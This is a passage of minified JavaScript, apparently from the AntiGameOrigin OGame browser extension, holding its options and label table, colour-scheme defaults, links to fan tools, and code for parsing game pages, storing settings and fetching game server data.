5,0,2],A28:[0,"Improve behavior"],A29:[0,"Show important only"],A30:[0,"Time settings"],A31:[1,"Change all time values into local time-zone",u,5],A32:[1,"Show server time in a additional clock",u,5],A34:[0,"Add a refresh timer and display the elapsed time",u,5],A38:[0,"Local time"],A39:[0,"Server time"],A41:[1,"Show update releases with level",C,5,0,2],A42:["","Final"],A43:["","Preview"],A48:[0,"Update to the final release version"],A49:[0,"Update to the preview release version"],A4B:[0,"Install"],
A50:[0,"Support"],A51:[0,"Home page"],A54:[0,"Forum"],A56:[0,"Thank you very much to all translation editors!"],A57:[0,"Translation"],A58:[0,"Use Firefox or Chrome to enable all features !"],A59:[0,"Preferably use the browser extension, please install it !"],A60:[0,"The support for userscript, Safari and  (maybe) Opera will stop soon"],A80:[0,"Common"],A81:[0,"Enable features"],A82:[0,"Enable"],AH1:[0,"Explanation"],AH2:[0,"Tip"],AH3:[0,"Hint"],AH5:[0,"Standard features"],AH6:[0,"Global features"],
AH7:[0,"Explanations"],AH8:[0,"Details"],AH9:[0,"Shortcuts"],AM0:[0,"AntiGameOrigin Options"],AM1:[0,"Save"],AM3:[0,"Save & Backup"],AM2:[0,"Cancel"],AT0:[0,"Settings for"],AT1:[0,"Default values"],AT2:[0,"Remaining resources"],AT3:[0,"Remaining ships"],AT4:[0,"Coordinates"],AT5:[0,"Type"],AT6:[0,"Mission"],AT7:[0,"Speed"],AT8:[0,"Holding time"],AT9:[0,"Expedition time"],ATC:[0,"Preferred cargo type "],ATR:[0,"Preferred resource"],ATS:[0,"Preferred combat ship"],ATT:[0,"Range for random system selection"],
B00:[0,"Buildings & Constructions"],B02:[1,"Show finish time",u,5],B04:[1,"Show unnecessary and useful research levels",u,5],B10:[1,"Show detailed resource information",u,5],B11:[0,"Total resources"],B12:[0,"Missing resources"],B13:[0,"Production"],B14:[0,"Energy needed"],B15:[0,"Available resources"],B21:[3,"Show name or details over the images",C,5,0,3],B22:[0,"Name"],B23:[0,"Details"],B24:[0,"Name & Details"],B30:[1,"",u,5],B31:[1,"Show detail information and target links.",u,5],B32:[0,"Require selecting a target before you can jump.",
u,5],B33:[1,"Hide the confirmation message after jump.",u,5],B34:[0,"Stay on the current Moon after jump",u,5],B35:[0,"'Most ships' lets always remain enough Cargo ships for all resources",u,5],B38:["","Select remaining ships and default target Moon",ca,5,"MS"],C00:[0,"Coloring & Highlighting"],CO0:[1,"Coloring scheme for own planets and moons",u,5],CM0:[1,"Coloring & highlight scheme for missions",u,5],CM1:[1,"Use the highlight scheme for foreign fleets",u,5],CM2:[33,"Default opacity for highlights (1-99)",
C,5,0,100],CM3:[55,"Opacity for returning fleets (1-100)",C,5,0,100],CC0:[1,"Coloring & highlight scheme for current details",u,5],CC1:[1,"Use the highlight scheme for current details",u,5],CC2:[33,"Default opacity for highlights (1-99)",C,5,0,100],CS0:[1,"Coloring & highlight scheme for status tags",u,5],CS1:[1,"Use the highlight scheme for status tags",u,5],CS2:[33,"Default opacity for highlights (1-99)",C,5,0,100],CI5:[0,"Color"],CI7:[0,"Opacity"],CI8:[0,"Conditions"],CI9:[0,"Limit"],C01:[1,"Always"],
C02:[1,"Alliance rank above"],C03:[1,"Alliance rank change"],C05:[1,"Player"],C06:[1,"Player rank above"],C07:[1,"Player rank change"],C08:[1,"Player status change"],C10:[1,"Position"],C11:[1,"Plunder above"],C13:[1,"Debris field above"],C15:[1,"Debris field change"],C16:[1,"Activity below"],C18:[1,"Activity change"],C20:[0,"Status colors"],C21:["#CFCBC2","Active",M,5,"status_abbr_active"],C22:["#6E6E6E","Inactive",M,5,"status_abbr_inactive"],C23:["#4F4F4F","Long inactive",M,5,"status_abbr_longinactive"],
C24:["#05FF08","Noob",M,5,"status_abbr_noob"],C25:["#FF0000","Strong",M,5,"status_abbr_strong"],C26:["#FFFF66","Honorable",M,5,"status_abbr_honorableTarget"],C27:["#FF33FF","Outlaw",M,5,"status_abbr_outlaw"],C28:["#FFFFFF","Banned",M,5,"status_abbr_banned"],C29:["#00FFFF","Vacation",M,5,"status_abbr_vacation"],C30:["#F48406","Admin",M,5,"status_abbr_admin"],C40:[0,"Friendly colors"],C41:["#008000","Alliance",M,5,"status_abbr_ally_own"],C42:["#008000","Wing",M,5,"status_abbr_wing"],C43:["#008000",
"Bootcamp",M,5,"status_abbr_bootcamp"],C44:["#008080","Confederation",M,5,"status_abbr_confederation"],C45:["#008080","Trader",M,5,"status_abbr_trader"],C46:["#008080","Trader 2",M,5,"status_abbr_trader2"],C47:["#226EBF","Buddies",M,5,"status_abbr_buddy"],C48:["#226EBF","Friends",M,5,"status_abbr_friends"],C49:["#226EBF","Friends 2",M,5,"status_abbr_friends2"],C60:[0,"Hostile colors"],C61:["#ffff00","Attackable",M,5,"status_abbr_attackable"],C62:["#ffff00","Observe",M,5,"status_abbr_observe"],C63:["#ffff00",
"Observe 2",M,5,"status_abbr_observe2"],C64:["#ffa500","Farm",M,5,"status_abbr_farm"],C65:["#ffa500","Farm 2",M,5,"status_abbr_farm2"],C66:["#ff4500","Target",M,5,"status_abbr_target"],C67:["#ff0000","Attack",M,5,"status_abbr_attack"],C68:["#ff0000","Enemy",M,5,"status_abbr_enemy"],C69:["#ff0000","War",M,5,"status_abbr_war"],C80:[0,"Current colors"],C81:["#1031A0","Current",M,5,"status_abbr_current"],C85:["#764DFF","Special",M,5,"status_abbr_special"],C89:["#FF1ADA","Attacking",M,5,"status_abbr_attacking"],
C91:["#D43635","Plunder",M,5,"status_abbr_plunder"],C92:["#D43635","Plunder 2",M,5,"status_abbr_plunder"],C93:["#D43635","Debris field",M,5,"status_abbr_debris"],C94:["#D43635","Debris field 2",M,5,"status_abbr_debris2"],C95:["#D43635|88","Debris field change",M,5,"status_abbr_debris_change"],C96:["#764DFF","Activity",M,5,"status_abbr_activity"],C97:["#764DFF","Activity 2",M,5,"status_abbr_activity2"],C98:["#764DFF|88","Activity change",M,5,"status_abbr_activity_change"],C99:["#FFFFFF","Remove group",
ea],H21:["0","",x,5],H22:["0","",x,5],H23:["0","",x,5],H24:["0","",x,5],H25:["0","",x,5],H26:["0","",x,5],H27:["0","",x,5],H28:["0","",x,5],H29:["0","",x,5],H30:["0","",x,5],H41:["0","",x,5],H42:["0","",x,5],H43:["0","",x,5],H44:["0","",x,5],H45:["0","",x,5],H46:["0","",x,5],H47:["0","",x,5],H48:["0","",x,5],H49:["0","",x,5],H61:["0","",x,5],H62:["0","",x,5],H63:["0","",x,5],H64:["0","",x,5],H65:["0","",x,5],H66:["0","",x,5],H67:["0","",x,5],H68:["0","",x,5],H69:["0","",x,5],H81:["1","",x,5],H85:["0",
"",x,5],H89:["0","",x,5],H91:["0|10000","",x,5],H92:["0","",x,5],H93:["13|10000","",x,5],H94:["0","",x,5],H95:["0","",x,5],H96:["0","",x,5],H97:["0","",x,5],H98:["0","",x,5],D00:[0,"Data & settings"],D01:[0,"Check and update all data & settings now"],D05:[0,"Update"],D06:[0,"Store"],D07:[0,"Restore"],D0B:[0,"Update data & settings"],D20:[1,"OGame API database",u,5],D25:[0,"Alliance database"],D26:[0,"Players database"],D27:[0,"Universe database"],D2B:[0,"Reset database"],D2C:[0,"Reset the browser database for this universe"],
D40:[1,"Data collection",u,5],D45:[0,"Account data"],D46:[0,"Galaxy data"],D47:[0,"Status tags"],D4B:[0,"Reset data collection"],D4C:[0,"Reset the account, galaxy and status data collection"],DT1:[0,"Show detail information"],O00:[1,"Main View"],O12:[1,"Show resource production summary in overview",u,5],O50:[1,"Planet list",u,5],O51:[1,"Moons on the right side with large active area",u,5],O52:[0,"Shrink planet list size",u,5],O53:[1,"Show construction titles",u,5],O54:[1,"Show function key number if they are activated",
u,5],I00:[1,"Infopanel",u,5],I01:[1,"Show infopanel when page starts",u,5],I05:[200,"Infopanel box size (width - height)",C,5],I06:[600,"",C,5],I07:[44,"Opacity if panel is inactive (1-100)",C,5,0,100],I0T:[0,"Pin details onto infopanel"],I10:[1,"Settings",u,5],I20:[1,"Tools",u,5],I30:[1,"Constructions",u,5],I40:[1,"Stationed",u,5],I50:[1,"Shipment",u,5],I60:[1,"Ships & resources - summary",u,5],I70:[1,"Status tags",u,5],IB0:[1,"Player details",u,5],IC0:[1,"Position details",u,5],T00:[1,"Tools",u,
5],T10:[0,"Search"],T1A:[1,"Ogniter",u,5,1],T1B:[1,"Infuza",u,5,1],T1C:[0,"War Riders",u,5,1],T11:["","",x,5],T12:["","",x,5],T13:["","",x,5],T14:["","",x,5],T15:["","",x,5],T20:[0,"Buildings"],T2A:[1,"Cumulative costs calc",u,5,1],T21:["","",x,5],T22:["","",x,5],T23:["","",x,5],T24:["","",x,5],T25:["","",x,5],T30:[0,"Resources"],T3A:[1,"Trade calc",u,5,0,"http://proxyforgame.com/ogame/calc/trade.php"],T3B:[1,"Trade Terminal",u,5,0,"http://ogamespec.com/tools/trade.php"],T31:["","",x,5],T32:["","",
x,5],T33:["","",x,5],T34:["","",x,5],T35:["","",x,5],T40:[0,"Fleet"],T4A:[1,"Flight time",u,5,0,"http://proxyforgame.com/ogame/calc/flight.php"],T4B:[1,"ACS Distribution",u,5,0,"http://www.toolsforogame.com/battle/batalla_ACS_SAC.aspx"],T4C:[1,"Sharing of gain",u,5,0,"Sharing of gain|snaquekiller.free.fr/ogame/tableau.html"],T41:["","",x,5],T42:["","",x,5],T43:["","",x,5],T44:["","",x,5],T45:["","",x,5],T50:[0,"Simulators"],T5A:[1,"OSimulate",u,5,0,"http://www.osimulate.com/"],T5B:[1,"WebSim",u,5,
0,"http://websim.speedsim.net/"],T5C:[1,"DragoSim",u,5,0,"http://drago-sim.com/"],T51:["","",x,5],T52:["","",x,5],T53:["","",x,5],T54:["","",x,5],T55:["","",x,5],T60:[0,"Espionage reports"],T61:["","",x,5],T62:["","",x,5],T63:["","",x,5],T64:["","",x,5],T65:["","",x,5],T70:[0,"Combat reports"],T7A:[1,"CR Hosting",u,5,0,"http://kb.un1matr1x.de/save.php"],T71:["","",x,5],T72:["","",x,5],T73:["","",x,5],T74:["","",x,5],T75:["","",x,5],T80:[0,"Tools"],T81:["Tools for Ogame|www.toolsforogame.com/","",
x,5],T82:["oRaiders|http://www.oraiders.com//","",x,5],T83:["o-calc|o-calc.com/","",x,5],T84:["Online tools|proxyforgame.com/","",x,5],T85:["Project AlTernative|www.projet-alternative.fr/","",x,5],T86:["o-tools|www.ghiroblu.com/o-tools/","",x,5],T87:["","",x,5],T88:["","",x,5],T89:["","",x,5],T90:[0,"Help"],T9A:[1,"Ogame Wiki",u,5,0,"http://wiki.ogame.org/"],T9B:[1,"Tolerated Ogame tools",u,5,0,"http://board.origin.ogame.de/index.php?page=Thread&threadID=104"],T91:["","",x,5],T92:["","",x,5],T93:["",
"",x,5],F00:[1,"",u,5],FS0:[0,"Fleet - Standards"],FR0:[0,"Fleet - Routines"],F01:[0,"Auto-copy coordinates",u,5],F03:[0,"Select routine with the return key when no ships choosen",C,5,0,13],F07:[0,"Show fleet dispatch summary when page starts"],F08:[0,"Differences for"],F09:[0,"Choose different settings for current position"],F02:[3,"Show name or details over the ship images",C,5,0,3],F10:[1,"Show target table when page starts",u,5],F11:[1,"",u,5],F12:[1,"Show speed selection list",u,5],F13:[1,"Adjust speed for the available capacity or deuterium",
u,5],F15:[1,"",u,5],F18:[1,"Remove warning that no further planets may be colonized",u,5],F19:[0,"Move moons to the end of the shortcuts list",u,5],F20:[1,"Missions and type selection",u,5],F22:[1,"Set to harvest and debris field if recycler in the fleet",u,5],F23:[1,"Set to colonization if only colony ships in the fleet",u,5],F24:[1,"Set to attack / espionage if only probes in the fleet",u,5],F25:[0,"Set to deploy on own coordinates",u,5],F26:[1,"Set to attack on foreign coordinates",u,5],F27:[1,
"Only when there are combat ships in fleet",u,5],F28:[1,"Only when player is not alliance member, buddy or friend",u,5],F2A:[1,"Set type in dependance from mission, ships and coordinates",u,5],F30:[0,"Standard ships and resources"],F31:["","Remaining ships and remaining / preferred resources",ca,5,"RS"],F37:[0,"Select most ships"],F38:[0,"Load most resources"],F39:[0,"Reset choice"],F40:[0,"Standard targets"],F41:["","",ca,5,"T"],F42:["","",ca,5,"T"],F43:["","",ca,5,"T"],F44:["","",ca,5,"T"],F45:["",
"",ca,5,"T"],F50:[1,"Show fleet details list",u,5],F53:[0,"Total capacity"],F54:[0,"Resources"],F55:[0,"Maximal speed"],F56:[0,"Expedition points"],F58:[0,"Minimal Duration (fleet union)"],FP1:[0,"Coordinates"],FPT:[0,"Parse the text - Get all coordinates and use the first one"],FL0:[0,"Routine Last"],FL1:[1,"Remember flights to own coordinates",u,5],FL2:[0,"Remember routine missions",u,5],FLB:[1,"Last"],FLT:[0,"Last mission settings and go to next page"],F60:[0,"Routine Calculator"],F61:["","Standard settings (details)",
ca,5,"TC"],F62:[0,"Show calculator when page starts",u,5],F64:[0,"Quantity"],F65:[0,"Duration"],F67:[0,"Consumption"],F69:[0,"Clear"],F6B:[0,"Calculator"],F6T:[0,"Calculator settings and go to next page"],F70:[0,"Routine Expedition"],F71:["","Standard settings (details)",ca,5,"TE"],F73:[1,"Send espionage probe",u,5],F7T:[0,"Expedition settings and go to next page"],F80:[0,"Routine Collect"],F81:["","Standard settings (details and remaining resources)",ca,5,"TCR"],F8T:[0,"Collect settings and go to next page"],
F90:[0,"Routine Fleetsave"],F91:["","Standard settings (details, remaining ships and resources)",ca,5,"TFRS"],F92:["","Positions for the random selection (none = off - 1,2,3)",da,5],F94:[0,"Warn when the resources aren't loaded",u,5],F95:[4,"Select mission in this order when nothing is selected",C,5,1,15],F96:[7,"",C,5,1,15],F97:[8,"",C,5,1,15],F9T:[0,"Fleetsave settings and go to next page"],FH0:[0,"Routine Harvest"],FP0:[0,"Routine Plunder"],FP7:[0,"Prefer small instead of large carge ships",u,
5],FP8:[0,"Send 10% more ships to get all loot for later attack",u,5],FA0:[0,"Routine Attack"],E10:[1,"",u,5],E12:[1,"Show fleet ships and cargo",u,5],E18:[0,"R"],E22:[1,"Show fleet composition and cargo",u,5],E24:[1,"Show theoretical debris",u,5],E30:[1,"",u,5],E31:[1,"Improve layout, show details and color missions",u,5],E35:[0,"Use ship name abbreviations",u,5],E41:[3,"",C,5,0,8],E42:[3,"",C,5,0,8],E43:[3,"",C,5,0,8],E44:[3,"",C,5,0,8],E45:[3,"",C,5,0,8],E46:[3,"",C,5,0,8],E47:[3,"Buildings",C,
5,0,8],E48:[3,"",C,5,0,8],E49:[3,"Other pages",C,5,0,8],E51:["#D43635","",ea,5],E52:["#D43635","",ea,5],E53:["#7EAD3D","",ea,5],E54:["#36B588","",ea,5],E55:["#D57936","",ea,5],E56:["#BD9B2F","",ea,5],E57:["#2BBFBF","",ea,5],E58:["#11A140","",ea,5],E59:["#FF3356","",ea,5],E60:["#FFCC66","",ea,5],E65:["#4162A5","",ea,5],E70:[0,"Ogame setting"],E71:[0,"Hide - Above"],E72:[0,"Hide - Above with details"],E73:[0,"Hide - Below"],E74:[0,"Hide - Below with details"],E75:[0,"Show - Above"],E76:[0,"Show - Above with details"],
E77:[0,"Show - Below"],E78:[0,"Show - Below with details"],G00:[1,"",u,5],G01:[1,"Improve layout, swap name and planet",u,5],G02:[0,"Shrink the galaxy page",C,5,0,3],G32:[1,"Show alliance ranks",u,5],G22:[1,"Show player ranks",u,5],G45:[3,"Show debris field size through",C,5,0,3],G46:[0,"Picture size"],G47:[0,"Number"],G48:[0,"Number (short)"],M04:[1,"Additional buttons on Messages",u,5],M05:[8,"Limit to delete small combat reports (probes/units)",C,5],M10:[0,"Espionage reports"],M12:[0,"Shrink report with reduced line spacing",
C,5,0,4],M14:[1,"Show activity time in title and hide details",u,5],M16:[0,"Open fleet I in an own tab or window",u,5],M20:[1,"Show plunder and debris in report and in headline",u,5],M21:["#1031A0","Background color for plunder and debris title",ea,5],M22:[0,"Debris"],M23:[0,"Total"],M24:[0,"Loot"],M28:[4,"Show as much plunder waves",C,5,1,9],M30:[1,"Hide reports below limits or hide details",C,5,0,5],M31:[0,"Hide all"],M32:[0,"Hide < Limit, buildings, research"],M33:[0,"Hide < Limit, buildings"],
M34:[0,"Hide < Limit"],M35:[0,"Show all"],M36:[10,"Plunder limit to hide or delete (x1000)",C,5],M37:[20,"Debris limit to hide or delete (x1000)",C,5],M3T:[0,"Hide/ show reports:"],M51:[1,"Spiohelper from Eleria",u,5],M53:[0,"Use short number format",u,5],M40:[1,"Espionage report simulators",u,5],M44:[1,"Preselect the amount of ships from your planet/moon",u,5],M45:["","Preselected ships for the simulator",ca,5,"S"],M46:[1,"Open simulators always in a new tab or window",u,5],M48:[1,"Set own techs to 0, when no researches in report",
u,5],M70:[0,"Combat reports"],M74:[1,"Fix colors of combat reports",u,5],M80:[0,"Delete shown or marked messages with subject $subject"],M81:[0,"Mark shown or marked messages as read"],M82:[0,"Delete shown or marked Spy reports with plunder < $plunder and debris < $debris"],M83:[0,"Delete shown or marked Combat reports with lost below"],M84:[0,"Delete shown or marked Expedition combats and results"],M85:[0,"Delete shown or marked Player messages"],M86:[0,"Espionage action on"],M87:[0,"Return of a fleet"],
M88:["","",da,5],M89:["","",da,5],M90:[0,"Delete shown or marked messages"],S08:[0,"Manual update"],S09:[0,"Auto update"],S11:["","",da,7],S12:["","",da,7],S13:["","",da,7],S14:["","",da,7],S15:["","",da,7],S16:[0,"",C,7],S17:[0,"",C,7],S20:[0,"Server data"],S21:[1,"Speed factor",C,8,1,100],S22:[9,"",C,8,1,100],S23:[499,"",C,8,1,499],S24:[16,"",C,0,1,17],S25:[1,"RF",C,8],S26:[1,"ACS",C,8],S27:[0,"DiDF",C,8],S28:[0.3,"",C,8,0,1],S29:[0.7,"",C,8,0,1],S31:[0,"",C,8],S32:[0,"",C,8],S35:[0,"",C,8],S45:[0,
"Server settings"],S46:[0,"Ogame labels"],S50:[0,"Troubleshooting"],S51:[0,"AntiGame uses currently the default option settings."],S52:[0,"AntiGame is running twice, please deactivate / remove one."],S53:[0,"Localstorage must be enabled"],S55:[0,"Problems with the browser database"],S58:[0,"Details and explanations to solve problems"],S59:[0,"Go to the fleet III to get the mission labels"],S5B:[0,"Read details"],S62:[0,"Go to menu for updating"],S63:[0,"Go to menu for solving problem"],S70:[0,"AntiGame data"],
S71:[1,"Update data from antigame.de server",C,5,0,1],S75:[0,"Options"],S76:[0,"Versions"],S77:[0,"Translation"],S7B:[0,"Reset options"],S7C:[0,"Reset the AntiGame options to default values ?"],S80:[0,"Backup via antigame.de server",u,5],S81:["","Optional name for the backup set (4-30 letters)",da,5],S89:[0,"Restore settings with backup from antigame.de server ?"],S8B:[0,"Restore settings"],S90:[0,"Backup via copy & paste"],S91:[0,"Select data and options to show in textbox below",C],S92:[0,"Options (account)"],
S93:[0,"Options (universal)"],S94:[0,"Options - Colors"],S95:[0,"Options - Highlighting"],S96:[0,"Options - Messages"],S99:[0,"Restore settings from the textbox below"],X01:[0,"Set simulated ships in OGame"],X02:[0,"Tactical retreat / Ships"],X03:[0,"Plunder ratio"],Y71:[0,"",C,5],LM01:["Attack"],LM02:["ACS Attack"],LM03:["Transport"],LM04:["Deployment"],LM05:["ACS Defend"],LM06:["Espionage"],LM07:["Colonization"],LM08:["Harvest"],LM09:["Moon Destruction"],LM15:["Expedition"],LP03:["Events"],LP07:["Jump Gate",
"Jump Gate"],LP21:["Phalanx"],LP30:["Messages"],L081:["Planet"],L082:["Debris field"],L083:["Moon"],L091:["Metal"],L092:["Crystal"],L093:["Deuterium"],L094:["Energy"],L095:["Darkmatter"],K091:["Met"],K092:["Crys"],K093:["Deut"],K202:["SC"],K203:["LC"],K204:["LF"],K205:["HF"],K206:["Crus"],K207:["BS"],K208:["Col"],K209:["Recs"],K210:["Probe"],K211:["BB"],K212:["Sat"],K213:["Dest"],K214:["RIP"],K215:["BC"]},Init:function(){e.host=document.location.hostname.toLowerCase();var a=e.host.split(".");e.uni=
a[0].toUpperCase();a.shift();e.domain=a.join(".");a=e.host.toUpperCase().split(".").reverse();e.server="ORG";"OGAME"===a[1]?e.server="ORG"===a[0]?J.check(a[2],"AE","BA","FI","HR","MX","TR")?a[2]:"ORG":a[0]:"OGAME"===a[2]&&"COM"===a[1]&&(e.server=a[0]);e.serverEnglish="ORG"===e.server||"US"===e.server?!0:!1},Load:function(){var a;a=document.location.search.match(/page=(\w+)/i);e.page=a?a[1].toLowerCase():"";if("fleet2"===e.page||"fleet3"===e.page)e.page=document.body.id||"";e.uniname=document.title.split("OGame")[0].trim();
var b=document.getElementsByTagName("head")[0].getElementsByTagName("meta");for(a=0;a<b.length;a++)if(b[a].name){var c=b[a].getAttribute("content");switch(b[a].name){case "ogame-planet-coordinates":e.coords=c;break;case "ogame-planet-type":e.type="moon"===c?Y:T;break;case "ogame-player-id":e.playerID=c;break;case "ogame-version":e.ogameVersion=c;break;case "ogame-planet-id":e.planetID=c}}for(a=21;99>a;a++)e.Data["C"+a]&&(e.Data["C"+a][6]=e.Data["C"+a][S]);b=[21,24,25,29,30,43,46,49,61,63,65,68];for(a in b)e.Data["C"+
b[a]]&&(e.Data["C"+b[a]][S]="");e.setDataString("Options");e.setDataString("Options",m.getStorage("OptionsLive")||"dummy");e.set("A06",e.get("A06")||e.server);m.Info.Options.status||(ia[11]=!0);e.loadVersions();e.setDataString("Server");e.set("S24",17);e.setDataString("Labels");e.serverEnglish?m.Info.Lang.status=1:e.setDataString("Lang");1<e.get("Y71")&&(ia[31]=!0)},Run:function(){s.LocalizationStrings&&(e.separator=s.LocalizationStrings.thousandSeperator,e.comma="."===e.separator?",":".",e.unitKilo=
s.LocalizationStrings.unitKilo,e.unitMega=s.LocalizationStrings.unitMega,e.unitMilliard=s.LocalizationStrings.unitMilliard,e.year=s.LocalizationStrings.timeunits["short"].year,e.week=s.LocalizationStrings.timeunits["short"].week,e.day=s.LocalizationStrings.timeunits["short"].day,e.hour=s.LocalizationStrings.timeunits["short"].hour,e.minute=s.LocalizationStrings.timeunits["short"].minute,e.second=s.LocalizationStrings.timeunits["short"].second)},getDataString:function(a,b,c){if(a&&m.Info[a]){var d=
"",j=0,t={};2===c&&(t={});10===c&&(t={D81:1});c&&"string"===typeof c&&(t=c,c=11);for(var v in e.Data)if(e.Data[v][3]===m.Info[a].group&&v===m.valid(v)&&(!c||10>c&&t[v]||10<=c&&!t[v]&&(10===c||-1<t.indexOf(v.charAt(0))))){var f=e.Data[v][X];j++;0===f?d+=";"+v+':"'+m.valid(e.Data[v][fa])+'"':f===u?d+=e.Data[v][S]?";"+v+':"1"':";"+v+':"0"':f===C?d+=";"+v+':"'+n.d(e.Data[v][S])+'"':f===ca?d+=";"+v+':"'+m.validTask(e.Data[v][S])+'"':f&&(d+=";"+v+':"'+m.valid(e.Data[v][S])+'"')}return'{AGO:"'+a+","+j+(1===
m.Info[a].store||10<=c?",,,":","+e.server+","+e.uni+","+e.playerID)+","+n.d(m.Info[a].version)+","+(b||A.timestamp())+',"'+d+";AGO}"}return""},setDataString:function(a,b){var c,d,j,t,v,g;if(a&&m.Info[a]&&(c=(b||m.getStorage(a)).split('";'),d=c.length-2,0<d&&(-1<c[0].indexOf('{AGO:"'+a+",")&&-1<c[c.length-1].indexOf("AGO}"))&&(j=c[0].split(","),v=+j[5]!==m.Info[a].version,t=+j[1]&&+j[1]!==d||j[2]&&j[2]!==e.server||j[3]&&j[3]!==e.uni||j[4]&&j[4]!==e.playerID||v&&"Options"!==a?!1:!0)))if(m.checkTimestamp(a,
j[6],2),v&&J.log("Para.setDataString - VersionChange"),"Labels"===a)for(g=1;g<=d;g++)j=c[g].split(':"'),t=j[0].slice(0,2),"LM"===t?e.Data[j[0]]&&(e.Data[j[0]][fa]=j[1]):(e.Data[j[0]]=[0,j[1],0,12],"LP"!==t&&j[1]&&(f.ItemByName[j[1]]=n.d(j[0].slice(1))+""));else if("Lang"===a||"LangMenu"===a||"LangHelp"===a)for(g=1;g<=d;g++)j=c[g].split(':"'),e.Data[j[0]]?j[1]&&(e.Data[j[0]][fa]=j[1]):e.Data[j[0]]=[0,j[1],0,m.Info[a].group];else for(g=1;g<=d;g++)if(j=c[g].split(':"'),t=j[0],v&&("J01"===t&&(t="B31"),
"J02"===t&&(t="B32"),"J05"===t&&(t="B33"),"J06"===t&&(t="B34"),"J12"===t&&(t="B35"),"J11"===t&&(t="B38"),"A21"===t&&(t="A31"),"A22"===t&&(t="A32"),"A27"===t&&(t="A34"),"A11"===t&&(t="A21"),"A12"===t&&(t="A22"),"A14"===t&&(t="A24"),"A15"===t&&(t="A25"),"A16"===t&&(t="A26"),"A17"===t&&(t="A27"),"O08"===t&&(t="A11"),"O09"===t&&(t="A12")),t&&e.Data[t])switch(e.Data[t][X]){case u:e.Data[t][S]=j[1]&&"0"!==j[1]?1:0;break;case C:e.Data[t][S]=+j[1]||0;break;default:e.Data[t][S]=j[1]||""}},setOptionsLive:function(a,
b){e.set(a,b);m.setStorage("OptionsLive",e.getDataString("Options","",2))},set:function(a,b,c,d){if(a=m.valid(a))!e.Data[a]&&c&&(e.Data[a]=[0,"",c,d||0]),e.Data[a]&&(e.Data[a][X]===u?e.Data[a][S]=b&&"0"!==b?1:0:e.Data[a][X]===C?e.Data[a][S]=n.d(b):e.Data[a][X]===ca?e.Data[a][S]=m.validTask(b):0<e.Data[a][X]&&(e.Data[a][S]=m.valid(b)))},setLabel:function(a,b,c){a=m.valid(a);b&&(a&&(c&&m.Info[c])&&(e.Data[a]=[0,"",0,m.Info[c].group]),a&&e.Data[a]&&(e.Data[a][fa]=m.valid(b)))},get:function(a,b){if(a&&
e.Data[a]){var c=e.Data[a];if(c[X]===u)return c[S];if(c[X]===C)return c[5]?n.minMax(c[S],c[4],c[5]):c[S];if(0<c[X])return c[S]}return b||""},getPair:function(a){return a&&e.Data[a]?e.Data[a][S]&&-1<e.Data[a][S].indexOf("|")?e.Data[a][S].split("|",2):(e.Data[a][S]+":").split(":",2):["",""]},getDefault:function(a){return a&&e.Data[a]?e.Data[a][6]||"":""},getColor:function(a,b){if(e.Data[a]&&(e.Data[a][X]===ea||e.Data[a][X]===M)){var c=(e.Data[a][S]||"").split("|");return w.color(c[0],b?n.d(c[1],b):
0)}return""},is:function(a){return a&&e.Data[a]&&e.Data[a][X]&&e.Data[a][S]?!0:!1},isOr:function(){for(var a=0;a<arguments.length;a++)if(arguments[a]&&e.Data[arguments[a]]&&e.Data[arguments[a]][X]&&e.Data[arguments[a]][S])return!0;return!1},isAnd:function(){for(var a=0;a<arguments.length;a++)if(arguments[a]){if(!e.Data[arguments[a]]||!e.Data[arguments[a]][S])break;if(a===arguments.length-1)return!0}return!1},label:function(a){return a&&e.Data[a]?e.Data[a][fa]||e.Data[a][S]||"":r.d(a)},getMore:function(a,
b){return(a&&e.Data[a]?e.Data[a][4]:b)||""},getDetail:function(a){return a&&e.Data[a]?e.Data[a][5]||"":""},Check:function(a,b){b&&(ja=!0);e.checkCounter=a?1:e.checkCounter+1;switch(e.checkCounter){case 1:e.checkServer();break;case 2:e.checkLabels();break;case 3:e.checkResearch();break;case 4:e.is("S71")&&setTimeout(e.checkVersions,0,!1),e.is("D20")&&setTimeout(I.Check,111,!0,ja),ja&&O.Update()}},checkServer:function(){var a,b;m.checkUpdate("Server")?(B.updateInfo("Server",3),a=-1,b=g.ajax({url:"../api/serverData.xml",
dataType:"xml"}),b.done(function(b){e.set("S21",g("speed",b).text());e.set("S22",g("galaxies",b).text());e.set("S23",g("systems",b).text());e.set("S25",g("rapidFire",b).text());e.set("S26",g("acs",b).text());e.set("S27",g("defToTF",b).text());e.set("S28",g("debrisFactor",b).text());e.set("S29",g("repairFactor",b).text());e.set("S31",g("newbieProtectionLimit",b).text());e.set("S32",g("newbieProtectionHigh",b).text());e.set("S35",g("topScore",b).text());m.setStorage("Server",e.getDataString("Server"));
a=4}),b.always(function(){e.setDataString("Server");B.updateInfo("Server",a);e.Check()})):e.Check()},checkLabels:function(){var a,b;m.checkUpdate("Labels")||!e.Data.LP02||!e.Data.LP02[fa]?(e.checkLabelsPages(),e.checkLabelsMissions(!0),B.updateInfo("Labels",3),a=-1,b=g.ajax({url:"../api/techNames.xml",dataType:"html"}),b.done(function(b){var d,j,t;if(b){b=b.split('<tech id="');for(d=1;d<b.length;d++)t=b[d].split('">'),j=n.d(t[0]),t=m.valid((t[1]||"").split("<")[0]),j&&e.setLabel("L"+r.trimZero(j,
3),t,"Labels");m.setStorage("Labels",e.getDataString("Labels"));a=4}}),b.always(function(){B.updateInfo("Labels",a);e.Check()})):e.Check()},checkLabelsMissions:function(a){var b,c,d;if("fleet3"===e.page&&(ja||!e.Data.LM01||!e.Data.LM01[fa]||a)){a=document.querySelectorAll("#inhalt #missions > li");for(b=0;b<a.length;b++)c=n.parseIntAbs(a[b].id),d=h.getTextByClass("textlabel",a[b]).trim(),c&&d&&e.setLabel("LM"+r.trimZero(c,2),d,"Labels");m.setStorage("Labels",e.getDataString("Labels"))}},checkLabelsPages:function(){var a,
b,c,d,j;if(ja||!e.Data.LP02||!e.Data.LP02[fa]){a=document.querySelectorAll("#links #menuTable > li");for(b=0;b<a.length;b++)if(c=r.getUrlPara("page",h.getAttributeByClass("menubutton","href",a[b])||"X"))switch(d=h.getText(".menubutton .textlabel",a[b]).trim(),j=h.getTitle(".menu_icon a",a[b]).trim(),c){case "overview":e.setLabel("LP02",d,"Labels");e.setLabel("LP03",j,"Labels");break;case "resources":e.setLabel("LP04",d,"Labels");e.setLabel("LP05",j,"Labels");break;case "station":e.setLabel("LP06",
